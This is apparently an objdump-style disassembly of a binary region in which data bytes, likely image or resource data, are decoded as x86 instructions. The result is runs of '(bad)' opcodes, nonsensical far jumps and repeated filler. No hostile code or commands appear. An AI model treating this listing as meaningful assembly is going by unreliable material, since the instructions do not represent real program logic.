  4140ca:	mov    ebp,0xeae7e1ff
  4140cf:	jmp    DWORD PTR [eax-0x66005f60]
  4140d5:	cdq    
  4140d6:	cdq    
  4140d7:	sahf   
	...
  4140e8:	mov    ah,0xb4
  4140ea:	mov    bl,0x41
  4140ec:	int3   
  4140ed:	into   
  4140ee:	iret   
  4140ef:	xchg   esi,eax
  4140f0:	mov    bl,0xb6
  4140f2:	mov    bh,0xf1
  4140f4:	aad    0xd5
  4140f6:	(bad)  
  4140f7:	(bad)  
  4140f8:	(bad)  
  4140fa:	(bad)  
  4140fc:	hlt    
  4140fd:	hlt    
  4140fe:	hlt    
  4140ff:	(bad)  
  414100:	(bad)  
  414101:	(bad)  
  414102:	(bad)  
  414103:	(bad)  
  414104:	(bad)  
  414105:	(bad)  
  414106:	(bad)  
  414107:	(bad)  
  414108:	sti    
  414109:	cli    
  41410a:	cli    
  41410b:	(bad)  
  41410c:	jmp    0xd2ce:0xc5ffeaea
  414113:	call   FWORD PTR [ecx+esi*2+0x42aaff6d]
  41411a:	cmp    bh,bh
  41411c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41411d:	sub    ebx,DWORD PTR [esi]
  41411f:	call   FWORD PTR [edi-0x5400fff8]
  414125:	push   ss
  414126:	add    bh,bh
  414128:	mov    dl,0x16
  41412a:	add    bh,bh
  41412c:	mov    edx,0xc2ff001a
  414131:	sbb    al,0x0
  414133:	dec    ebx
  414135:	push   ds
  414136:	add    bh,bh
  414138:	rcr    DWORD PTR [edi],cl
  41413a:	add    bh,bh
  41413c:	fisub  DWORD PTR [edx]
  41413e:	add    bh,bh
  414140:	jecxz  0x414166
  414142:	add    bh,bh
  414144:	in     al,dx
  414145:	pop    ds
  414146:	add    bh,bh
  414148:	repz aaa 
  41414a:	adc    edi,edi
  41414c:	(bad)  
  41414d:	mov    dl,0xa2
  41414f:	(bad)  
  414150:	jmp    ebx
  414152:	fdiv   st(7),st
  414154:	(bad)  
  414155:	fcmovbe st,st(1)
  414157:	(bad)  
  414158:	(bad)  
  414159:	fcmovbe st,st(0)
  41415b:	(bad)  
  41415c:	(bad)  
  41415d:	fcmovnbe st,st(0)
  41415f:	dec    eax
  414161:	mov    ah,0xad
  414163:	push   DWORD PTR [edx-0x39004e4f]
  414169:	mov    dh,0xff
  41416c:	mov    dl,0xb0
  41416e:	scas   eax,DWORD PTR es:[edi]
  41416f:	call   ecx
  414171:	mov    ecx,0xe2ffffaf
  414176:	aad    0xff
  414178:	jmp    edx
  41417a:	(bad)  
  41417b:	(bad)  
  41417c:	jmp    ebp
  41417e:	fdivr  st,st(7)
  414180:	(bad)  
  414181:	jmp    0xc9414165
  414186:	mov    al,0xff
  414188:	call   0xe840fc55
  41418d:	out    dx,al
  41418e:	lock jmp FWORD PTR [edx-0x69005556]
  414195:	xchg   esi,eax
  414196:	xchg   esi,eax
  414197:	scas   eax,DWORD PTR es:[edi]
	...
  4141b0:	scas   eax,DWORD PTR es:[edi]
  4141b1:	mov    ah,0xb4
  4141b3:	sub    dh,BYTE PTR [ecx-0x50bf4c4d]
  4141b9:	mov    al,0xb0
  4141bb:	mov    DWORD PTR [edx-0x37004344],edi
  4141c1:	retf   0xffca
  4141c4:	fcmovu st,st(3)
  4141c6:	(bad)  
  4141c8:	repz hlt 
  4141ca:	hlt    
  4141cb:	(bad)  
  4141cc:	(bad)  
  4141cd:	(bad)  
  4141ce:	(bad)  
  4141cf:	call   ebp
  4141d1:	(bad)  
  4141d3:	jmp    FWORD PTR [ebx+ecx*4+0xb91ff8a]
  4141da:	add    bh,bh
  4141dc:	sahf   
  4141dd:	(bad)  
  4141df:	jmp    DWORD PTR [ecx+edx*1+0x15acff00]
  4141e6:	add    bh,bh
  4141e8:	mov    ch,0x17
  4141ea:	add    bh,bh
  4141ec:	mov    ebp,0xc4ff0019
  4141f1:	sbb    al,0x0
  4141f3:	dec    esi
  4141f5:	push   ds
  4141f6:	add    bh,bh
  4141f8:	(bad)  
  4141f9:	and    BYTE PTR [eax],al
  4141fb:	(bad)  
  4141fc:	fsub   QWORD PTR [ebx]
  4141fe:	add    bh,bh
  414200:	out    0x24,al
  414202:	add    bh,bh
  414204:	out    dx,al
  414205:	sbb    al,0x0
  414207:	(bad)  
  414208:	clc    
  414209:	push   esp
  41420a:	xor    bh,bh
  41420c:	call   ecx
  41420e:	(bad)  
  41420f:	(bad)  
  414210:	jmp    edi
  414212:	loop   0x414213
  414214:	(bad)  
  414215:	(bad)  
  414217:	(bad)  
  414218:	(bad)  
  414219:	(bad)  
  41421b:	(bad)  
  41421c:	jmp    eax
  41421e:	xlat   BYTE PTR ds:[ebx]
  41421f:	(bad)  
  414220:	cli    
  414221:	fst    st(4)
  414223:	inc    edx
  414225:	mov    dl,0xad
  414227:	(bad)  
  414228:	mov    esp,0xb9ffb5b8
  41422d:	scas   al,BYTE PTR es:[edi]
  41422e:	test   eax,0xcdd7edff
  414233:	(bad)  
  414234:	jmp    edi
  414236:	(bad)  
  414238:	jmp    edi
  41423a:	fdivp  st(7),st
  41423c:	(bad)  
  41423d:	jmp    0xee414220
  414242:	out    0xff,al
  414244:	call   ebp
  414246:	sar    edi,0xe9
  414249:	(bad)  
  41424a:	mov    eax,0xf5f2eeff
  41424f:	(bad)  
  414250:	mov    ecx,0x93ffb9b9
  414255:	xchg   ebx,eax
  414256:	xchg   ebx,eax
  414257:	mov    BYTE PTR [eax],0x0
	...
  41427a:	add    BYTE PTR [eax],al
  41427c:	scas   eax,DWORD PTR es:[edi]
  41427d:	mov    dl,0xb2
  41427f:	sbb    eax,0x3db3b3b1
  414284:	scas   eax,DWORD PTR es:[edi]
  414285:	mov    bl,0xb2
  414287:	cwde   
  414288:	mov    ecx,0xc6ffbbbb
  41428d:	mov    edi,0xd7d5ceff
  414293:	push   DWORD PTR [ecx-0x79006766]
  414299:	add    BYTE PTR [eax],al
  41429b:	call   FWORD PTR [ebp-0x5900fff6]
  4142a1:	adc    eax,0x15aeff00
  4142a6:	add    bh,bh
  4142a8:	mov    bh,0x17
  4142aa:	add    bh,bh
  4142ac:	mov    esi,0xc6ff001b
  4142b1:	sbb    al,0x0
  4142b3:	call   eax
  4142b5:	pop    ds
  4142b6:	add    bh,bh
  4142b8:	fsub   DWORD PTR [edx]
  4142ba:	add    bh,bh
  4142bc:	fisub  WORD PTR [ebx]
  4142be:	add    bh,bh
  4142c0:	call   0xf14042e8
  4142c5:	and    BYTE PTR [eax],al
  4142c7:	(bad)  
  4142c8:	cli    
  4142c9:	jb     0x414321
  4142cb:	(bad)  
  4142cc:	jmp    ebx
  4142ce:	fdivp  st(7),st
  4142d0:	jmp    edi
  4142d2:	loope  0x4142d3
  4142d4:	jmp    esp
  4142d6:	(bad)  
  4142d8:	jmp    esp
  4142da:	fdiv   st(7),st
  4142dc:	jmp    esp
  4142de:	fdiv   st(7),st
  4142e0:	jmp    esi
  4142e2:	(bad)  
  4142e4:	(bad)  
  4142e5:	call   0xea4142c8
  4142ea:	(bad)  
  4142ec:	(bad)  
  4142ed:	jmp    0xec4142d2
  4142f2:	in     al,0xff
  4142f4:	(bad)  
  4142f5:	in     eax,dx
  4142f6:	in     eax,0xff
  4142f8:	(bad)  
  4142f9:	out    dx,eax
  4142fa:	call   0xea3142fe
  4142ff:	(bad)  
  414300:	push   ebp
  414302:	lock (bad) 
  414304:	jmp    ebx
  414306:	aam    0xff
  414308:	jmp    0x4142d0
  41430a:	mov    ch,0xff
  41430c:	repnz cmc 
  41430e:	idiv   edi
  414310:	(bad)  
  414311:	(bad)
  414314:	xchg   edx,eax
  414315:	xchg   edx,eax
  414316:	xchg   edx,eax
  414317:	ficomp DWORD PTR [ebx+0xf9b9b]
	...
  414345:	add    BYTE PTR [eax],al
  414347:	add    BYTE PTR [ebx-0x53f3494a],dh
  41434d:	mov    al,0xb0
  41434f:	and    edi,DWORD PTR [edx+eax*8-0x544d243b]
  414356:	test   eax,0x986ff
  41435b:	jmp    DWORD PTR [ecx-0x5800fff9]
  414361:	adc    eax,0x16afff00
  414366:	add    bh,bh
  414368:	mov    eax,0xbfff0018
  41436d:	sbb    al,BYTE PTR [eax]
  41436f:	dec    eax
  414371:	sbb    eax,0x1fd2ff00
  414376:	add    bh,bh
  414378:	(bad)  [ecx]
  41437a:	add    bh,bh
  41437c:	loope  0x4143a2
  41437e:	add    bh,bh
  414380:	jmp    0x25:0xf3ff0022
  414387:	(bad)  
  414388:	(bad)  
  414389:	xchg   ebp,eax
  41438a:	cmp    bh,0xff
  41438d:	repnz in eax,dx
  41438f:	(bad)  
  414390:	(bad)  
  414391:	jmp    0x41437a
  414393:	(bad)  
  414394:	(bad)  
  414395:	jmp    0x41437c
  414397:	(bad)  
  414398:	(bad)  
  414399:	in     eax,dx
  41439a:	out    0xff,eax
  41439c:	(bad)  
  41439d:	out    dx,al
  41439e:	jmp    0xeb3243a2
  4143a3:	(bad)  
  4143a4:	push   eax
  4143a6:	jmp    0xffff:0xe8f0ffff
  4143ad:	out    dx,eax
  4143ae:	jmp    0xe63043b2
  4143b3:	(bad)  
  4143b4:	(bad)  
  4143b5:	jmp    0x414397
  4143b7:	(bad)  
  4143b8:	jmp    esi
  4143ba:	fcos   
  4143bc:	(bad)  
  4143bd:	(bad)  
  4143bf:	(bad)  
  4143c0:	(bad)  
  4143c1:	fcmovne st,st(4)
  4143c3:	(bad)  
  4143c4:	inc    bh
  4143c6:	lods   al,BYTE PTR ds:[esi]
  4143c7:	jmp    ebx
  4143c9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4143ca:	(bad)  
  4143cb:	push   edx
  4143cd:	cmc    
  4143ce:	idiv   edi
  4143d0:	rcl    bl,cl
  4143d2:	sar    edi,cl
  4143d4:	lea    ecx,[ebp-0x66660f73]
  4143da:	cdq    
  4143db:	xor    al,0x0
	...
  41440d:	add    BYTE PTR [eax],al
  41440f:	add    bh,al
  414411:	into   
  414412:	shl    DWORD PTR [ebx-0x49],1
  414415:	mov    ebx,0x1b8affba
  41441a:	adc    eax,0x1a1ff
  41441f:	jmp    FWORD PTR [eax-0x4f00ffeb]
  414425:	push   ss
  414426:	add    bh,bh
  414428:	mov    ecx,0xc0ff0019
  41442d:	sbb    eax,DWORD PTR [eax]
  41442f:	dec    ecx
  414431:	push   ds
  414432:	add    bh,bh
  414434:	shl    DWORD PTR [edx],cl
  414436:	add    bh,bh
  414438:	(bad)  [eax+eax*1]
  41443b:	jmp    ebx
  41443d:	daa    
  41443e:	add    bh,bh
  414440:	in     al,dx
  414441:	and    DWORD PTR [eax],eax
  414443:	(bad)  
  414444:	clc    
  414445:	cmp    BYTE PTR [edx],dl
  414447:	(bad)  
  414448:	(bad)  
  414449:	mov    ebp,0xfdffffae
  41444e:	sti    
  41444f:	(bad)  
  414450:	(bad)  
  414451:	jmp    0x414438
  414453:	(bad)  
  414454:	jmp    esp
  414456:	(bad)  
  414458:	(bad)  
  414459:	(bad)  
  41445b:	(bad)  
  41445c:	(bad)  
  41445d:	fmul   st,st(0)
  41445f:	(bad)  
  414460:	call   edx
  414462:	mov    esi,0xb8cbfeff
  414467:	(bad)  
  414468:	std    
  414469:	(bad)  
  41446a:	mov    cl,0xff
  41446c:	inc    dl
  41446e:	test   eax,0xa0bbf7ff
  414473:	(bad)  
  414474:	out    dx,al
  414475:	mov    dh,0x9d
  414477:	(bad)  
  414478:	jmp    0xea40e432
  41447d:	mov    ebx,0xc1eaffa7
  414482:	mov    al,0xff
  414484:	in     eax,dx
  414485:	les    esi,FWORD PTR [edx-0x4a3d2101]
  41448b:	push   esi
  41448d:	clc    
  41448e:	stc    
  41448f:	(bad)  
  414490:	(bad)  
  414492:	loopne 0x414493
  414494:	xchg   esp,eax
  414495:	xchg   esp,eax
  414496:	xchg   esp,eax
  414497:	std    
  414498:	lods   al,BYTE PTR ds:[esi]
  414499:	lods   al,BYTE PTR ds:[esi]
  41449a:	lods   al,BYTE PTR ds:[esi]
  41449b:	sub    al,BYTE PTR [eax]
	...
  4144cd:	add    BYTE PTR [eax],al
  4144cf:	add    al,cl
  4144d1:	int3   
  4144d2:	into   
  4144d3:	cmp    eax,0xffc4c4b8
  4144d8:	(bad)  
  4144d9:	aaa    
  4144da:	xor    edi,edi
  4144dc:	popf   
  4144dd:	add    BYTE PTR [eax],al
  4144df:	jmp    FWORD PTR [ecx-0x4d00ffe9]
  4144e5:	sbb    BYTE PTR [eax],al
  4144e7:	(bad)  
  4144e8:	mov    esi,0xc5ff001b
  4144ed:	sbb    al,BYTE PTR [eax]
  4144ef:	call   ecx
  4144f1:	sbb    al,BYTE PTR [eax]
  4144f3:	(bad)  
  4144f4:	fst    QWORD PTR [esi]
  4144f6:	add    bh,bh
  4144f8:	jecxz  0x41450d
  4144fa:	add    bh,bh
  4144fc:	jmp    0xb:0xf1ff0010
  414503:	push   esi
  414505:	daa    
  414506:	add    bh,bh
  414508:	clc    
  414509:	mov    WORD PTR [ebp-0x1],?
  41450c:	icebp  
  41450d:	scas   eax,DWORD PTR es:[edi]
  41450e:	lahf   
  41450f:	(bad)  
  414510:	in     al,dx
  414511:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414512:	xchg   ebp,eax
  414513:	(bad)  
  414514:	jmp    0x4144bd
  414516:	xchg   ebx,eax
  414517:	jmp    esi
  414519:	test   al,0x95
  41451b:	(bad)  
  41451c:	fsubr  QWORD PTR [ebx-0x48250063]
  414522:	stos   DWORD PTR es:[edi],eax
  414523:	(bad)  
  414524:	faddp  st(1),st
  414526:	mov    bh,0xff
  414528:	in     al,0xc9
  41452a:	mov    ebp,0xbfc8e3ff
  41452f:	(bad)  
  414530:	fmul   st(0),st
  414532:	sar    bh,0xd5
  414535:	retf   0xffc4
  414538:	(bad)  
  414539:	ror    edi,1
  41453b:	(bad)  
  41453c:	fcomp  st(1)
  41453e:	fdivr  st,st(7)
  414540:	fcmovnu st,st(6)
  414542:	(bad)  
  414544:	(bad)  
  414546:	in     al,0xff
  414548:	fsubrp st(6),st
  41454a:	jmp    0xe6272b45
  41454f:	jecxz  0x41452f
  414551:	(bad)  
  414553:	mov    edi,0x62bbbbbb
	...
  414590:	ret    0xc6c3
  414593:	push   ds
  414594:	mov    ecx,0x98ffcac7
  414599:	dec    ecx
  41459a:	inc    ebp
  41459b:	call   FWORD PTR [ebp-0x55010000]
  4145a1:	add    eax,0x4afff00
  4145a6:	add    bh,bh
  4145a8:	mov    bh,0x7
  4145aa:	add    bh,bh
  4145ac:	mov    bh,0xc
  4145ae:	add    bh,bh
  4145b0:	mov    edx,0xbbff011b
  4145b5:	xor    BYTE PTR [edx],bl
  4145b7:	(bad)  
  4145b8:	mov    esi,0xcaff3448
  4145bd:	pop    esi
  4145be:	dec    ebp
  4145bf:	dec    edx
  4145c1:	jne    0x41462b
  4145c3:	inc    esp
  4145c5:	nop
  4145c6:	test   edi,edi
  4145c8:	retf   0xaab0
  4145cb:	dec    esi
  4145cd:	mov    edi,0xc7cfffbd
  4145d2:	(bad)  
  4145d3:	call   ebx
  4145d5:	into   
  4145d6:	into   
  4145d7:	call   eax
  4145d9:	iret   
  4145da:	iret   
  4145db:	dec    edi
  4145dd:	rcl    ebx,1
  4145df:	dec    edi
  4145e1:	rcl    ebp,cl
  4145e3:	dec    edi
  4145e5:	aad    0xd6
  4145e7:	clc    
  4145e8:	into   
  4145e9:	rcl    ebp,cl
  4145eb:	icebp  
  4145ec:	into   
  4145ed:	rcl    esi,cl
  4145ef:	(bad)  
  4145f1:	aad    0xd7
  4145f3:	retf   0xd9d3
  4145f6:	fld    TBYTE PTR [ecx-0x7427282d]
  4145fc:	rcl    ebp,cl
  4145fe:	fcomp  DWORD PTR [esi-0x35]
  414601:	int3   
  414602:	int    0x36
  414604:	rcl    cl,1
  414606:	rcr    DWORD PTR [edx+ebx*8],1
  414609:	fcmovu st,st(2)
  41460b:	push   ss
  41460c:	(bad)  
  41460e:	fcom   QWORD PTR [eax]
  414610:	(bad)  
  414612:	fiadd  WORD PTR [edi]
	...
  414650:	rol    edx,0xc4
  414653:	adc    dh,BYTE PTR [esi-0x61123d42]
  414659:	jne    0x4146cb
  41465b:	inc    DWORD PTR [ebp-0x6400d6d0]
  414661:	pusha  
  414662:	pop    edx
  414663:	jmp    FWORD PTR [esi-0x4d008581]
  414669:	xchg   edx,eax
  41466a:	nop
  41466b:	push   DWORD PTR [eax-0x4a005c5c]
  414671:	mov    eax,0xc8bbffb9
  414676:	int3   
  414677:	inc    ecx
  414679:	rcl    ch,cl
  41467b:	dec    eax
  41467d:	fcomp  st(2)
  41467f:	dec    ebx
  414681:	fcmovnu st,st(4)
  414683:	dec    ebx
  414685:	fcomp  st(2)
  414687:	clc    
  414688:	retf   
  414689:	rcl    ah,cl
  41468b:	out    0xcb,eax
  41468d:	iret   
  41468e:	rcr    cl,1
  414690:	retf   
  414691:	into   
  414692:	iret   
  414693:	leave  
  414694:	leave  
  414695:	int    0xce
  414697:	stos   DWORD PTR es:[edi],eax
  414698:	int    0xcf
  41469a:	rcl    BYTE PTR [eax+0x75d0cecd],1
  4146a0:	into   
  4146a1:	into   
  4146a2:	into   
  4146a3:	inc    ebp
  4146a4:	leave  
  4146a5:	retf   
  4146a6:	retf   0xc828
  4146a9:	enter  0x9c8,0x0
	...
  41470d:	add    BYTE PTR [eax],al
  41470f:	add    BYTE PTR [eax-0x4dee5459],ch
  414715:	mov    cl,0xb3
  414717:	in     eax,0xc0
  414719:	leave  
  41471a:	retf   0xbcff
  41471d:	int3   
  41471e:	iret   
  41471f:	inc    esp
  414721:	rcl    dh,cl
  414723:	inc    ebp
  414725:	rcl    esp,1
  414727:	test   bh,0xcf
  41472a:	shr    al,cl
  41472c:	leave  
  41472d:	iret   
  41472e:	rcl    ah,1
  414730:	enter  0xcbcb,0xbe
  414734:	enter  0xcbc9,0xab
  414738:	(bad)  
  414739:	enter  0x92c8,0xc9
  41473d:	retf   0x72ca
  414740:	leave  
  414741:	leave  
  414742:	leave  
  414743:	pop    eax
  414744:	retf   
  414745:	retf   
  414746:	int3   
  414747:	aaa    
  414748:	retf   0xcaca
  41474b:	sbb    BYTE PTR [eax],al
	...
  4147cd:	add    BYTE PTR [eax],al
  4147cf:	add    BYTE PTR [ebx-0x58fb6065],bl
  4147d5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4147d6:	test   eax,0xc4c2c466
  4147db:	nop
  4147dc:	sar    BYTE PTR [esi-0x44448641],0xbd
  4147e3:	pop    edx
  4147e4:	mov    edi,0xc33dbfbd
  4147e9:	ret    
  4147ea:	ret    
  4147eb:	daa    
  4147ec:	enter  0xc9c8,0xc
	...
  414894:	stos   DWORD PTR es:[edi],eax
  414895:	stos   DWORD PTR es:[edi],eax
  414896:	lods   eax,DWORD PTR ds:[esi]
  414897:	or     dl,dl
  414899:	rcl    edx,1
  41489b:	(bad)  
  41489d:	ret    0x3c3
  4148a0:	mov    ebx,0x1bdbb
	...
  414b5d:	add    BYTE PTR [eax],al
  414b5f:	add    bh,bh
  414b61:	(bad)  
  414b62:	(bad)  
  414b63:	(bad)  
  414b64:	(bad)  
  414b65:	inc    DWORD PTR [eax]
  414b67:	add    bh,bh
  414b69:	(bad)  
  414b6a:	(bad)  
  414b6b:	(bad)  
  414b6c:	(bad)  
  414b6d:	inc    DWORD PTR [eax]
  414b6f:	add    bh,bh
  414b71:	(bad)  
  414b72:	(bad)  
  414b73:	(bad)  
  414b74:	(bad)  
  414b75:	inc    DWORD PTR [eax]
  414b77:	add    bh,bh
  414b79:	(bad)  
  414b7a:	cld    
  414b7b:	add    BYTE PTR [edi],bl
  414b7d:	inc    DWORD PTR [eax]
  414b7f:	add    bh,bh
  414b81:	push   eax
  414b83:	add    BYTE PTR [edi],al
  414b85:	pop    DWORD PTR [eax]
  414b87:	add    bh,bh
  414b89:	jmp    eax
  414b8b:	add    BYTE PTR [ecx],al
  414b8d:	add    DWORD PTR [eax],eax
  414b8f:	add    bh,bh
  414b91:	inc    eax
  414b93:	add    BYTE PTR [eax],al
  414b95:	add    BYTE PTR [eax],al
  414b97:	add    bh,bh
  414b99:	inc    DWORD PTR [eax+0x0]
  414b9f:	add    bh,bh
  414ba1:	inc    DWORD PTR [eax+0x0]
  414ba7:	add    bh,bh
  414ba9:	inc    DWORD PTR [eax+0x0]
  414baf:	add    bh,bh
  414bb1:	inc    DWORD PTR [eax+0x0]
  414bb7:	add    al,al
  414bb9:	pop    es
  414bba:	add    BYTE PTR [eax],0x0
  414bbd:	add    BYTE PTR [eax],al
  414bbf:	add    BYTE PTR [eax+0xc001],al
  414bc5:	add    BYTE PTR [eax],al
  414bc7:	add    BYTE PTR [eax+0x7000],al
  414bcd:	sldt   WORD PTR [eax]
  414bd0:	add    BYTE PTR [eax],0xc
  414bd3:	add    BYTE PTR [eax],al
  414bd5:	sldt   WORD PTR [eax]
  414bd8:	add    BYTE PTR [eax],0x0
  414bdb:	add    BYTE PTR [eax],al
  414bdd:	sldt   WORD PTR [eax]
  414be0:	add    BYTE PTR [eax],0x0
  414be3:	add    BYTE PTR [eax],al
  414be5:	sldt   WORD PTR [eax]
  414be8:	add    BYTE PTR [eax],0x0
  414beb:	add    BYTE PTR [eax],al
  414bed:	sldt   WORD PTR [eax]
  414bf0:	add    BYTE PTR [eax],0x0
  414bf3:	add    BYTE PTR [eax],al
  414bf5:	sldt   WORD PTR [eax]
  414bf8:	add    BYTE PTR [eax],0x0
  414bfb:	add    BYTE PTR [eax],al
  414bfd:	sldt   WORD PTR [eax]
  414c00:	add    BYTE PTR [eax],0x0
  414c03:	add    BYTE PTR [eax],al
  414c05:	sldt   WORD PTR [eax]
  414c08:	add    BYTE PTR [eax],0x0
  414c0b:	add    BYTE PTR [eax],al
  414c0d:	pop    es
  414c0e:	add    BYTE PTR [eax],al
  414c10:	add    BYTE PTR [eax],0x0
  414c13:	add    BYTE PTR [eax],al
  414c15:	pop    es
  414c16:	add    BYTE PTR [eax],al
  414c18:	add    BYTE PTR [eax],0x0
  414c1b:	add    BYTE PTR [eax],al
  414c1d:	pop    es
  414c1e:	add    BYTE PTR [eax],al
  414c20:	add    BYTE PTR [eax],0x0
  414c23:	add    BYTE PTR [eax],al
  414c25:	pop    es
  414c26:	add    BYTE PTR [eax],al
  414c28:	add    BYTE PTR [eax],0x0
  414c2b:	add    BYTE PTR [eax],al
  414c2d:	pop    es
  414c2e:	add    BYTE PTR [eax],al
  414c30:	add    BYTE PTR [eax],0x0
  414c33:	add    BYTE PTR [eax],al
  414c35:	pop    es
  414c36:	add    BYTE PTR [eax],al
  414c38:	add    BYTE PTR [eax],0x0
  414c3b:	add    BYTE PTR [eax],al
  414c3d:	pop    es
  414c3e:	add    BYTE PTR [eax],al
  414c40:	add    BYTE PTR [eax],0x0
  414c43:	add    BYTE PTR [eax],al
  414c45:	pop    es
  414c46:	add    BYTE PTR [eax],al
  414c48:	add    BYTE PTR [eax],0x0
  414c4b:	add    BYTE PTR [eax],al
  414c4d:	add    eax,DWORD PTR [eax]
  414c4f:	add    BYTE PTR [eax+0x0],al
  414c55:	add    eax,DWORD PTR [eax]
  414c57:	add    BYTE PTR [eax+0x0],al
  414c5d:	add    eax,DWORD PTR [eax]
  414c5f:	add    BYTE PTR [eax+0x0],al
  414c65:	add    eax,DWORD PTR [eax]
  414c67:	add    BYTE PTR [eax+0x0],al
  414c6d:	add    eax,DWORD PTR [eax]
  414c6f:	add    al,al
  414c71:	add    BYTE PTR [eax],al
  414c73:	add    BYTE PTR [eax],al
  414c75:	add    eax,DWORD PTR [eax]
  414c77:	add    al,dh
  414c79:	add    BYTE PTR [eax],al
  414c7b:	add    BYTE PTR [eax],al
  414c7d:	add    eax,DWORD PTR [eax]
  414c7f:	add    dh,bh
  414c81:	add    BYTE PTR [eax],al
  414c83:	add    BYTE PTR [eax],al
  414c85:	add    DWORD PTR [eax],eax
  414c87:	add    bh,bh
  414c89:	rol    BYTE PTR [eax],0x0
  414c8c:	add    BYTE PTR [ecx],al
  414c8e:	add    BYTE PTR [eax],al
  414c90:	push   eax
  414c92:	add    BYTE PTR [eax],al
  414c94:	add    BYTE PTR [ecx],al
  414c96:	add    BYTE PTR [eax],al
  414c98:	push   eax
  414c9a:	add    BYTE PTR [eax],al
  414c9c:	add    BYTE PTR [ebx],al
  414c9e:	add    BYTE PTR [eax],al
  414ca0:	push   eax
  414ca2:	add    BYTE PTR [eax],al
  414ca4:	add    BYTE PTR [edi],al
  414ca6:	add    BYTE PTR [eax],al
  414ca8:	push   eax
  414caa:	add    BYTE PTR [eax],al
  414cac:	pop    ds
  414cad:	inc    DWORD PTR [eax]
  414caf:	add    bh,bh
  414cb1:	lock add BYTE PTR [edi],bl
  414cb4:	(bad)  
  414cb5:	inc    DWORD PTR [eax]
  414cb7:	add    bh,bh
  414cb9:	lock ud0 edi,edi
  414cbd:	inc    DWORD PTR [eax]
  414cbf:	add    bh,bh
  414cc1:	clc    
  414cc2:	jg     0x414cc3
  414cc4:	(bad)  
  414cc5:	inc    DWORD PTR [eax]
  414cc7:	add    bh,bh
  414cc9:	(bad)  
  414cca:	(bad)  
  414ccb:	(bad)  
  414ccc:	(bad)  
  414ccd:	inc    DWORD PTR [eax]
  414ccf:	add    bh,bh
  414cd1:	(bad)  
  414cd2:	(bad)  
  414cd3:	(bad)  
  414cd4:	(bad)  
  414cd5:	inc    DWORD PTR [eax]
  414cd7:	add    bh,bh
  414cd9:	(bad)  
  414cda:	(bad)  
  414cdb:	(bad)  
  414cdc:	(bad)  
  414cdd:	inc    DWORD PTR [eax]
  414cdf:	add    BYTE PTR [eax],ch
  414ce1:	add    BYTE PTR [eax],al
  414ce3:	add    BYTE PTR [eax],ah
  414ce5:	add    BYTE PTR [eax],al
  414ce7:	add    BYTE PTR [eax+0x0],al
  414cea:	add    BYTE PTR [eax],al
  414cec:	add    DWORD PTR [eax],eax
  414cee:	and    BYTE PTR [eax],al
  414cf0:	add    BYTE PTR [eax],al
  414cf2:	add    BYTE PTR [eax],al
  414cf4:	adc    BYTE PTR [eax],0x0
	...
  414e43:	add    BYTE PTR [eax-0x47fb4f50],dh
  414e49:	mov    eax,0xaaaa4ab8
  414e4e:	stos   BYTE PTR es:[edi],al
  414e4f:	xchg   BYTE PTR [esi-0x4669494a],dh
  414e55:	mov    ecx,0xa1a195b9
  414e5a:	mov    eax,ds:0x81818195
  414e5f:	xchg   DWORD PTR [edi+0x77],esi
  414e62:	ja     0x414eb2
  414e64:	jbe    0x414edc
  414e66:	jbe    0x414e6e
	...
  414ec0:	sahf   
  414ec1:	sahf   
  414ec2:	sahf   
  414ec3:	fs mov edi,0xd5d5d9c7
  414eca:	aad    0xff
  414ecc:	fstp   st(5)
  414ece:	(bad)  
  414ed0:	loop   0x414eb4
  414ed2:	loop   0x414ed3
  414ed4:	fcmovu st,st(2)
  414ed6:	(bad)  
  414ed8:	(bad)  
  414ed9:	(bad)  
  414eda:	(bad)  
  414edb:	(bad)  
  414edc:	(bad)  
  414ede:	fdiv   st(7),st
  414ee0:	enter  0xc8c8,0xff
  414ee4:	mov    ds:0x97bda2a2,al
  414ee9:	xchg   edi,eax
  414eea:	xchg   edi,eax
  414eeb:	pop    edi
	...
  414ef8:	add    BYTE PTR [eax],al
  414efa:	add    BYTE PTR [edx],al
  414efc:	add    BYTE PTR [eax],al
  414efe:	add    BYTE PTR [ecx],al
	...
  414f38:	xchg   edi,eax
  414f39:	xchg   edi,eax
  414f3a:	xchg   edi,eax
  414f3b:	or     ebp,DWORD PTR [edi-0x26185051]
  414f41:	(bad)  
  414f43:	(bad)  
  414f44:	(bad)  
  414f46:	fcos   
  414f48:	(bad)  
  414f4a:	fdiv   st(7),st
  414f4c:	loopne 0x414f2e
  414f4e:	loopne 0x414f4f
  414f50:	(bad)  
  414f52:	(bad)  
  414f54:	rcl    al,1
  414f56:	sar    bh,1
  414f58:	iret   
  414f59:	iret   
  414f5a:	iret   
  414f5b:	(bad)  
  414f5c:	jmp    0xcdcd:0xcdffeaea
  414f63:	dec    esi
  414f65:	into   
  414f66:	into   
  414f67:	call   eax
  414f69:	rcl    al,1
  414f6b:	jmp    DWORD PTR [eax+0x1daca0a0]
  414f71:	sbb    eax,0x361d
  414f76:	add    BYTE PTR [ecx],cl
  414f78:	add    BYTE PTR [eax],al
  414f7a:	add    BYTE PTR [ecx],ch
  414f7c:	add    BYTE PTR [eax],al
  414f7e:	add    BYTE PTR [esi],dl
  414f80:	add    BYTE PTR [eax],al
  414f82:	add    BYTE PTR [eax+eax*1],al
	...
  414fb5:	add    BYTE PTR [eax],al
  414fb7:	add    BYTE PTR [ebx-0x2c184c4d],dh
  414fbd:	rcl    ebx,cl
  414fbf:	inc    edi
  414fc1:	mov    edi,0xc8c8c8ff
  414fc7:	call   esp
  414fc9:	aam    0xd4
  414fcb:	(bad)  
  414fcc:	(bad)  
  414fce:	(bad)  
  414fd0:	loope  0x414fb3
  414fd2:	loope  0x414fd3
  414fd4:	rcl    dl,cl
  414fd6:	sar    bh,cl
  414fd8:	iret   
  414fd9:	iret   
  414fda:	iret   
  414fdb:	(bad)  
  414fdc:	fcmovu st,st(2)
  414fde:	(bad)  
  414fe0:	mov    ebp,0xc3ffbdbd
  414fe5:	ret    
  414fe6:	ret    
  414fe7:	push   DWORD PTR [esi-0x3a00494a]
  414fed:	(bad)
  414ff0:	mov    al,0xb0
  414ff2:	mov    al,0xff
  414ff4:	add    BYTE PTR [eax],al
  414ff6:	add    BYTE PTR [eax+eax*1+0x0],dl
  414ffa:	add    BYTE PTR [edx],bh
  414ffc:	add    BYTE PTR [eax],al
  414ffe:	add    BYTE PTR [esi],ch
  415000:	add    BYTE PTR [eax],al
